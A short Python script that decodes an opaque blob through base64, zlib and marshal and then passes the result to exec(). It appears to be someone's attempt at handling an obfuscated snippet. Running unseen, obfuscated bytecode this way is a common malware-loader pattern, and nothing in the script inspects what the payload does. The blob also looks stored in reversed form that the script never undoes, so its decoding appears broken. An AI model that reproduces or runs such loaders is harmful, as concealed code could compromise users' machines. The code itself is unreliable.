import base64
import zlib
import marshal

# The obfuscated script snippet
obfuscated_code = b'=wL641WB//Y97/to3fJ//r6HydKf/tv//9s+j//Xn7/3/Fv//su/x+/vr7/XzzfVXV1vnv////vM16SNzrOrmsQ00p7Ry7Jf0Y9m3jbfvf5vWqioKeENHdc2SQYAroeHCQhRElEePa7rHn7kgJ4ggLMSgwIewAQDgcRUuHIKAr2qUPBSg8RH2KaD1LOeg'

# Step 1: Base64 decode
decoded_data = base64.b64decode(obfuscated_code)

# Step 2: Decompress with zlib
decompressed_data = zlib.decompress(decoded_data)

# Step 3: Unmarshal the decompressed data
marshalled_code = marshal.loads(decompressed_data)

# Step 4: Execute the code
exec(marshalled_code)
